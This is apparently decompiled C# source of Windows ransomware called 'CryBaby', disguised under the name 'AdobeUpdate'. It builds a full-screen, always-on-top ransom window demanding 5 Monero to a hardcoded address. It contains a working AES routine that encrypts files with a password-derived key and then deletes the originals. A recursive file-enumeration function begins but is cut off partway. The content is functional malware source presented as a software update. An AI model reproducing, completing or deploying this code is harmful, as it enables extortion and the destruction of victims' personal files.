using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Configuration;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Windows.Forms;
using AdobeUpdate.My;
using AdobeUpdate.My.Resources;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace AdobeUpdate;

[DesignerGenerated]
public class frmCryBaby : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("lblNotify")]
	private Label _lblNotify;

	[AccessedThroughProperty("cmdSend")]
	private Button _cmdSend;

	[AccessedThroughProperty("Label8")]
	private Label _Label8;

	[AccessedThroughProperty("txtXMR")]
	private TextBox _txtXMR;

	[AccessedThroughProperty("profileWorker")]
	private BackgroundWorker _profileWorker;

	[AccessedThroughProperty("Label6")]
	private Label _Label6;

	[AccessedThroughProperty("Label7")]
	private Label _Label7;

	[AccessedThroughProperty("Label5")]
	private Label _Label5;

	[AccessedThroughProperty("Label4")]
	private Label _Label4;

	[AccessedThroughProperty("Label3")]
	private Label _Label3;

	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("txtEmailAddess")]
	private TextBox _txtEmailAddess;

	[AccessedThroughProperty("txtCryptoPassword")]
	private TextBox _txtCryptoPassword;

	[AccessedThroughProperty("cmdDecrypt")]
	private Button _cmdDecrypt;

	[AccessedThroughProperty("cmdExit")]
	private Button _cmdExit;

	[AccessedThroughProperty("Label9")]
	private Label _Label9;

	[AccessedThroughProperty("rootWorker")]
	private BackgroundWorker _rootWorker;

	[AccessedThroughProperty("Label10")]
	private Label _Label10;

	[AccessedThroughProperty("Label11")]
	private Label _Label11;

	private int Is_Run_Day;

	private string User_Profile_Path;

	private string User_Computer_Name;

	private string Crypto_Dec_Key;

	private string Crypto_Pass;

	private string Crypto_File_Original;

	private string Crypto_File_New;

	private bool Crypto_EncDec;

	internal virtual Label lblNotify
	{
		[DebuggerNonUserCode]
		get
		{
			return _lblNotify;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lblNotify = value;
		}
	}

	internal virtual Button cmdSend
	{
		[DebuggerNonUserCode]
		get
		{
			return _cmdSend;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = cmdSend_Click;
			if (_cmdSend != null)
			{
				((Control)_cmdSend).remove_Click(eventHandler);
			}
			_cmdSend = value;
			if (_cmdSend != null)
			{
				((Control)_cmdSend).add_Click(eventHandler);
			}
		}
	}

	internal virtual Label Label8
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label8 = value;
		}
	}

	internal virtual TextBox txtXMR
	{
		[DebuggerNonUserCode]
		get
		{
			return _txtXMR;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_txtXMR = value;
		}
	}

	internal virtual BackgroundWorker profileWorker
	{
		[DebuggerNonUserCode]
		get
		{
			return _profileWorker;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			RunWorkerCompletedEventHandler value2 = profileWorker_RunWorkerCompleted;
			DoWorkEventHandler value3 = profileWorker_DoWork;
			if (_profileWorker != null)
			{
				_profileWorker.RunWorkerCompleted -= value2;
				_profileWorker.DoWork -= value3;
			}
			_profileWorker = value;
			if (_profileWorker != null)
			{
				_profileWorker.RunWorkerCompleted += value2;
				_profileWorker.DoWork += value3;
			}
		}
	}

	internal virtual Label Label6
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label6 = value;
		}
	}

	internal virtual Label Label7
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label7 = value;
		}
	}

	internal virtual Label Label5
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label5 = value;
		}
	}

	internal virtual Label Label4
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label4 = value;
		}
	}

	internal virtual Label Label3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label3 = value;
		}
	}

	internal virtual Label Label2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label2 = value;
		}
	}

	internal virtual Label Label1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual TextBox txtEmailAddess
	{
		[DebuggerNonUserCode]
		get
		{
			return _txtEmailAddess;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_txtEmailAddess = value;
		}
	}

	internal virtual TextBox txtCryptoPassword
	{
		[DebuggerNonUserCode]
		get
		{
			return _txtCryptoPassword;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_txtCryptoPassword = value;
		}
	}

	internal virtual Button cmdDecrypt
	{
		[DebuggerNonUserCode]
		get
		{
			return _cmdDecrypt;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = cmdDecrypt_Click;
			if (_cmdDecrypt != null)
			{
				((Control)_cmdDecrypt).remove_Click(eventHandler);
			}
			_cmdDecrypt = value;
			if (_cmdDecrypt != null)
			{
				((Control)_cmdDecrypt).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button cmdExit
	{
		[DebuggerNonUserCode]
		get
		{
			return _cmdExit;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = cmdExit_Click;
			if (_cmdExit != null)
			{
				((Control)_cmdExit).remove_Click(eventHandler);
			}
			_cmdExit = value;
			if (_cmdExit != null)
			{
				((Control)_cmdExit).add_Click(eventHandler);
			}
		}
	}

	internal virtual Label Label9
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label9 = value;
		}
	}

	internal virtual BackgroundWorker rootWorker
	{
		[DebuggerNonUserCode]
		get
		{
			return _rootWorker;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			DoWorkEventHandler value2 = rootWorker_DoWork;
			if (_rootWorker != null)
			{
				_rootWorker.DoWork -= value2;
			}
			_rootWorker = value;
			if (_rootWorker != null)
			{
				_rootWorker.DoWork += value2;
			}
		}
	}

	internal virtual Label Label10
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label10;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label10 = value;
		}
	}

	internal virtual Label Label11
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label11;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label11 = value;
		}
	}

	public frmCryBaby()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Expected O, but got Unknown
		((Form)this).add_FormClosing(new FormClosingEventHandler(frmCryBaby_FormClosing));
		((Form)this).add_Load((EventHandler)frmCryBaby_Load);
		__ENCAddToList(this);
		Is_Run_Day = 0;
		User_Profile_Path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
		User_Computer_Name = Environment.MachineName.ToString();
		Crypto_Dec_Key = "";
		Crypto_Pass = "";
		Crypto_File_Original = "";
		Crypto_File_New = "";
		Crypto_EncDec = true;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Expected O, but got Unknown
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ec: Expected O, but got Unknown
		//IL_0115: Unknown result type (might be due to invalid IL or missing references)
		//IL_011f: Expected O, but got Unknown
		//IL_025c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0266: Expected O, but got Unknown
		//IL_02ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f4: Expected O, but got Unknown
		//IL_03a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_03b3: Expected O, but got Unknown
		//IL_0452: Unknown result type (might be due to invalid IL or missing references)
		//IL_045c: Expected O, but got Unknown
		//IL_04fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0505: Expected O, but got Unknown
		//IL_05fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0605: Expected O, but got Unknown
		//IL_06b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_06bd: Expected O, but got Unknown
		//IL_075d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0767: Expected O, but got Unknown
		//IL_07f7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0801: Expected O, but got Unknown
		//IL_0866: Unknown result type (might be due to invalid IL or missing references)
		//IL_0870: Expected O, but got Unknown
		//IL_09ff: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a09: Expected O, but got Unknown
		//IL_0ab1: Unknown result type (might be due to invalid IL or missing references)
		//IL_0abb: Expected O, but got Unknown
		//IL_0b5c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b66: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(frmCryBaby));
		lblNotify = new Label();
		cmdSend = new Button();
		Label8 = new Label();
		txtXMR = new TextBox();
		profileWorker = new BackgroundWorker();
		Label6 = new Label();
		Label7 = new Label();
		Label5 = new Label();
		Label4 = new Label();
		Label3 = new Label();
		Label2 = new Label();
		Label1 = new Label();
		txtEmailAddess = new TextBox();
		txtCryptoPassword = new TextBox();
		cmdDecrypt = new Button();
		cmdExit = new Button();
		Label9 = new Label();
		rootWorker = new BackgroundWorker();
		Label10 = new Label();
		Label11 = new Label();
		((Control)this).SuspendLayout();
		((Control)lblNotify).set_BackColor(Color.Transparent);
		((Control)lblNotify).set_Font(new Font("Microsoft Sans Serif", 18f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)lblNotify).set_ForeColor(Color.Yellow);
		Label obj = lblNotify;
		Point location = new Point(473, 344);
		((Control)obj).set_Location(location);
		((Control)lblNotify).set_Name("lblNotify");
		Label obj2 = lblNotify;
		Size size = new Size(491, 273);
		((Control)obj2).set_Size(size);
		((Control)lblNotify).set_TabIndex(33);
		lblNotify.set_Text("Encryption Complete");
		lblNotify.set_TextAlign((ContentAlignment)32);
		((Control)lblNotify).set_Visible(false);
		((Control)cmdSend).set_Enabled(false);
		Button obj3 = cmdSend;
		location = new Point(338, 368);
		((Control)obj3).set_Location(location);
		((Control)cmdSend).set_Name("cmdSend");
		Button obj4 = cmdSend;
		size = new Size(129, 26);
		((Control)obj4).set_Size(size);
		((Control)cmdSend).set_TabIndex(31);
		((ButtonBase)cmdSend).set_Text("Send My Address");
		((ButtonBase)cmdSend).set_UseVisualStyleBackColor(true);
		Label8.set_AutoSize(true);
		((Control)Label8).set_BackColor(Color.Transparent);
		((Control)Label8).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label8).set_ForeColor(Color.White);
		Label label = Label8;
		location = new Point(8, 259);
		((Control)label).set_Location(location);
		((Control)Label8).set_Name("Label8");
		Label label2 = Label8;
		size = new Size(167, 20);
		((Control)label2).set_Size(size);
		((Control)Label8).set_TabIndex(30);
		Label8.set_Text("XMR Deposit Address");
		((Control)txtXMR).set_Font(new Font("Microsoft Sans Serif", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TextBox obj5 = txtXMR;
		location = new Point(12, 282);
		((Control)obj5).set_Location(location);
		txtXMR.set_Multiline(true);
		((Control)txtXMR).set_Name("txtXMR");
		((TextBoxBase)txtXMR).set_ReadOnly(true);
		TextBox obj6 = txtXMR;
		size = new Size(956, 33);
		((Control)obj6).set_Size(size);
		((Control)txtXMR).set_TabIndex(29);
		((Control)txtXMR).set_TabStop(false);
		txtXMR.set_Text("46kiRZNn1eLGvTfg5SZfMPT1CRJVJjDEU8y2eBRHKQPoM2ryqZxpQRkRZJXgj141TLVo4JjVJTm3eU5Dtm66KKicS8yHQzX");
		txtXMR.set_TextAlign((HorizontalAlignment)2);
		((Control)Label6).set_BackColor(Color.Transparent);
		((Control)Label6).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label6).set_ForeColor(Color.White);
		Label label3 = Label6;
		location = new Point(12, 116);
		((Control)label3).set_Location(location);
		((Control)Label6).set_Name("Label6");
		Label label4 = Label6;
		size = new Size(956, 29);
		((Control)label4).set_Size(size);
		((Control)Label6).set_TabIndex(28);
		Label6.set_Text("With the deposit use your email address as the personal note/memo. This email address is where your decryption key will be sent.\r\n");
		Label6.set_TextAlign((ContentAlignment)32);
		((Control)Label7).set_BackColor(Color.Transparent);
		((Control)Label7).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label7).set_ForeColor(Color.White);
		Label label5 = Label7;
		location = new Point(12, 82);
		((Control)label5).set_Location(location);
		((Control)Label7).set_Name("Label7");
		Label label6 = Label7;
		size = new Size(956, 27);
		((Control)label6).set_Size(size);
		((Control)Label7).set_TabIndex(27);
		Label7.set_Text("If you want your data back deposit 5 XMR (Monero) into the address below.");
		Label7.set_TextAlign((ContentAlignment)32);
		((Control)Label5).set_BackColor(Color.Transparent);
		((Control)Label5).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label5).set_ForeColor(Color.White);
		Label label7 = Label5;
		location = new Point(12, 48);
		((Control)label7).set_Location(location);
		((Control)Label5).set_Name("Label5");
		Label label8 = Label5;
		size = new Size(956, 27);
		((Control)label8).set_Size(size);
		((Control)Label5).set_TabIndex(26);
		Label5.set_Text("Your desktop, documents, pictures and music has all been encrypted.");
		Label5.set_TextAlign((ContentAlignment)32);
		Label4.set_AutoSize(true);
		Label label9 = Label4;
		location = new Point(78, 67);
		((Control)label9).set_Location(location);
		((Control)Label4).set_Name("Label4");
		Label label10 = Label4;
		size = new Size(0, 13);
		((Control)label10).set_Size(size);
		((Control)Label4).set_TabIndex(25);
		((Control)Label3).set_BackColor(Color.Transparent);
		((Control)Label3).set_Font(new Font("Microsoft Sans Serif", 18f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label3).set_ForeColor(Color.White);
		Label label11 = Label3;
		location = new Point(236, 12);
		((Control)label11).set_Location(location);
		((Control)Label3).set_Name("Label3");
		Label label12 = Label3;
		size = new Size(458, 32);
		((Control)label12).set_Size(size);
		((Control)Label3).set_TabIndex(24);
		Label3.set_Text(">>> Your files have been encrypted <<<");
		Label3.set_TextAlign((ContentAlignment)32);
		Label2.set_AutoSize(true);
		((Control)Label2).set_BackColor(Color.Transparent);
		((Control)Label2).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label2).set_ForeColor(Color.White);
		Label label13 = Label2;
		location = new Point(8, 411);
		((Control)label13).set_Location(location);
		((Control)Label2).set_Name("Label2");
		Label label14 = Label2;
		size = new Size(153, 20);
		((Control)label14).set_Size(size);
		((Control)Label2).set_TabIndex(23);
		Label2.set_Text("Your Decryption Key");
		Label1.set_AutoSize(true);
		((Control)Label1).set_BackColor(Color.Transparent);
		((Control)Label1).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label1).set_ForeColor(Color.White);
		Label label15 = Label1;
		location = new Point(8, 345);
		((Control)label15).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label16 = Label1;
		size = new Size(149, 20);
		((Control)label16).set_Size(size);
		((Control)Label1).set_TabIndex(22);
		Label1.set_Text("Your Email Address");
		((Control)txtEmailAddess).set_Enabled(false);
		((Control)txtEmailAddess).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TextBox obj7 = txtEmailAddess;
		location = new Point(12, 368);
		((Control)obj7).set_Location(location);
		((Control)txtEmailAddess).set_Name("txtEmailAddess");
		TextBox obj8 = txtEmailAddess;
		size = new Size(315, 26);
		((Control)obj8).set_Size(size);
		((Control)txtEmailAddess).set_TabIndex(19);
		((Control)txtCryptoPassword).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TextBox obj9 = txtCryptoPassword;
		location = new Point(12, 434);
		((Control)obj9).set_Location(location);
		txtCryptoPassword.set_Multiline(true);
		((Control)txtCryptoPassword).set_Name("txtCryptoPassword");
		TextBox obj10 = txtCryptoPassword;
		size = new Size(455, 217);
		((Control)obj10).set_Size(size);
		((Control)txtCryptoPassword).set_TabIndex(21);
		((Control)txtCryptoPassword).set_TabStop(false);
		((Control)cmdDecrypt).set_Enabled(false);
		Button obj11 = cmdDecrypt;
		location = new Point(822, 620);
		((Control)obj11).set_Location(location);
		((Control)cmdDecrypt).set_Name("cmdDecrypt");
		Button obj12 = cmdDecrypt;
		size = new Size(146, 31);
		((Control)obj12).set_Size(size);
		((Control)cmdDecrypt).set_TabIndex(20);
		((Control)cmdDecrypt).set_TabStop(false);
		((ButtonBase)cmdDecrypt).set_Text("Give Me Back My Files");
		((ButtonBase)cmdDecrypt).set_UseVisualStyleBackColor(true);
		Button obj13 = cmdExit;
		location = new Point(935, 6);
		((Control)obj13).set_Location(location);
		((Control)cmdExit).set_Name("cmdExit");
		Button obj14 = cmdExit;
		size = new Size(38, 21);
		((Control)obj14).set_Size(size);
		((Control)cmdExit).set_TabIndex(34);
		((ButtonBase)cmdExit).set_Text("Exit");
		((ButtonBase)cmdExit).set_UseVisualStyleBackColor(true);
		((Control)cmdExit).set_Visible(false);
		((Control)Label9).set_BackColor(Color.Transparent);
		((Control)Label9).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label9).set_ForeColor(Color.White);
		Label label17 = Label9;
		location = new Point(12, 152);
		((Control)label17).set_Location(location);
		((Control)Label9).set_Name("Label9");
		Label label18 = Label9;
		size = new Size(956, 89);
		((Control)label18).set_Size(size);
		((Control)Label9).set_TabIndex(35);
		Label9.set_Text(componentResourceManager.GetString("Label9.Text"));
		Label9.set_TextAlign((ContentAlignment)32);
		((Control)Label10).set_BackColor(Color.Transparent);
		((Control)Label10).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label10).set_ForeColor(Color.White);
		Label label19 = Label10;
		location = new Point(7, 316);
		((Control)label19).set_Location(location);
		((Control)Label10).set_Name("Label10");
		Label label20 = Label10;
		size = new Size(961, 32);
		((Control)label20).set_Size(size);
		((Control)Label10).set_TabIndex(36);
		Label10.set_Text("DO NOT CLOSE THIS WITHOUT SENDING YOUR ADDRESS, THIS IS YOUR ONLY CHANCE");
		Label10.set_TextAlign((ContentAlignment)32);
		((Control)Label11).set_BackColor(Color.Transparent);
		((Control)Label11).set_Font(new Font("Microsoft Sans Serif", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label11).set_ForeColor(Color.White);
		Label label21 = Label11;
		location = new Point(62, 659);
		((Control)label21).set_Location(location);
		((Control)Label11).set_Name("Label11");
		Label label22 = Label11;
		size = new Size(855, 82);
		((Control)label22).set_Size(size);
		((Control)Label11).set_TabIndex(37);
		Label11.set_Text(componentResourceManager.GetString("Label11.Text"));
		Label11.set_TextAlign((ContentAlignment)32);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackgroundImage((Image)(object)Resources.CryBabyBG);
		((Control)this).set_BackgroundImageLayout((ImageLayout)3);
		size = new Size(979, 749);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)Label11);
		((Control)this).get_Controls().Add((Control)(object)Label10);
		((Control)this).get_Controls().Add((Control)(object)Label9);
		((Control)this).get_Controls().Add((Control)(object)cmdExit);
		((Control)this).get_Controls().Add((Control)(object)lblNotify);
		((Control)this).get_Controls().Add((Control)(object)cmdSend);
		((Control)this).get_Controls().Add((Control)(object)Label8);
		((Control)this).get_Controls().Add((Control)(object)txtXMR);
		((Control)this).get_Controls().Add((Control)(object)Label6);
		((Control)this).get_Controls().Add((Control)(object)Label7);
		((Control)this).get_Controls().Add((Control)(object)Label5);
		((Control)this).get_Controls().Add((Control)(object)Label4);
		((Control)this).get_Controls().Add((Control)(object)Label3);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)txtEmailAddess);
		((Control)this).get_Controls().Add((Control)(object)txtCryptoPassword);
		((Control)this).get_Controls().Add((Control)(object)cmdDecrypt);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("frmCryBaby");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("AdobeUpdate");
		((Form)this).set_TopMost(true);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	public void EncryptDecryptFile(string password, string in_file, string out_file, bool encdec)
	{
		CryptFile(password, in_file, out_file, encdec);
		Crypto_EncDec = encdec;
	}

	public void CryptFile(string password, string in_file, string out_file, bool encrypt)
	{
		using FileStream in_stream = new FileStream(in_file, FileMode.Open, FileAccess.Read);
		using FileStream out_stream = new FileStream(out_file, FileMode.Create, FileAccess.Write);
		CryptStream(password, in_stream, out_stream, encrypt);
	}

	public void CryptStream(string password, Stream in_stream, Stream out_stream, bool encrypt)
	{
		AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
		int key_size_bits = 0;
		int num = 1024;
		do
		{
			if (!aesCryptoServiceProvider.ValidKeySize(num))
			{
				num = checked(num + -1);
				continue;
			}
			key_size_bits = num;
			break;
		}
		while (num >= 1);
		int blockSize = aesCryptoServiceProvider.BlockSize;
		byte[] key = null;
		byte[] iv = null;
		byte[] salt = new byte[14]
		{
			0, 0, 1, 2, 3, 4, 5, 6, 241, 240,
			238, 33, 34, 69
		};
		MakeKeyAndIV(password, salt, key_size_bits, blockSize, ref key, ref iv);
		ICryptoTransform cryptoTransform = ((!encrypt) ? aesCryptoServiceProvider.CreateDecryptor(key, iv) : aesCryptoServiceProvider.CreateEncryptor(key, iv));
		try
		{
			using CryptoStream cryptoStream = new CryptoStream(out_stream, cryptoTransform, CryptoStreamMode.Write);
			byte[] buffer = new byte[1025];
			while (true)
			{
				int num2 = in_stream.Read(buffer, 0, 1024);
				if (num2 == 0)
				{
					break;
				}
				cryptoStream.Write(buffer, 0, num2);
			}
			cryptoStream.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		out_stream.Close();
		in_stream.Close();
		out_stream.Dispose();
		in_stream.Dispose();
		cryptoTransform.Dispose();
		aesCryptoServiceProvider.Dispose();
		RemoveOriginal(Crypto_File_Original);
	}

	public void RemoveOriginal(string File_To_Delete)
	{
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			File.Delete(File_To_Delete);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(File_To_Delete);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.ToString(), (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
	}

	public void MakeKeyAndIV(string password, byte[] salt, int key_size_bits, int block_size_bits, ref byte[] key, ref byte[] iv)
	{
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(password, salt, 1000);
		checked
		{
			key = rfc2898DeriveBytes.GetBytes((int)Math.Round((double)key_size_bits / 8.0));
			iv = rfc2898DeriveBytes.GetBytes((int)Math.Round((double)block_size_bits / 8.0));
		}
	}

	public void GetSpecifiedFiles(string strPath)
	{
		int try0001_dispatch = -1;
		int num = default(int);
		DirectoryInfo directoryInfo = default(DirectoryInfo);
		int num2 = default(int);
		int num3 = default(int);
		FileInfo current = default(FileInfo);
		IEnumerator<DirectoryInfo> enumerator = default(IEnumerator<DirectoryInfo>);
		DirectoryInfo current2 = default(DirectoryInfo);
		IEnumerator<FileInfo> enumerator2 = default(IEnumerator<FileInfo>);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					num = 1;
					directoryInfo = new DirectoryInfo(strPath);
					goto IL_000b;
				case 249:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000b;
						case 3:
							goto IL_0014;
						case 4:
							goto IL_0022;
						case 5:
							goto IL_003a;
						case 6:
							goto IL_0049;
						case 7:
							goto IL_0063;
						case 8:
							goto IL_007d;
						case 9:
							goto IL_0098;
						default:
							goto end_IL_0001;
						case 10:
						case 11:
							goto end_IL_0001_2;
						}
						goto default;
					}
					IL_0049:
					num = 6;
					goto IL_004c;
					IL_007d:
					num = 8;
					AddFileName(strPath + "\\" + current.get_Name(), current);
					goto IL_0098;
					IL_000b:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0014;
					IL_0014:
					num = 3;
					if (!directoryInfo.get_Exists())
					{
						goto end_IL_0001_2;
					}
					goto IL_0022;
					IL_0022:
					num = 4;
					enumerator = directoryInfo.EnumerateDirectories().GetEnumerator();
					goto IL_004c;
					IL_004c:
					if (enumerator.MoveNext())
					{
						current2 = enumerator.Current;
						goto IL_003a;
					}
					enumerator?.Dispose();
					goto IL_0063;
					IL_003a:
					num = 5;
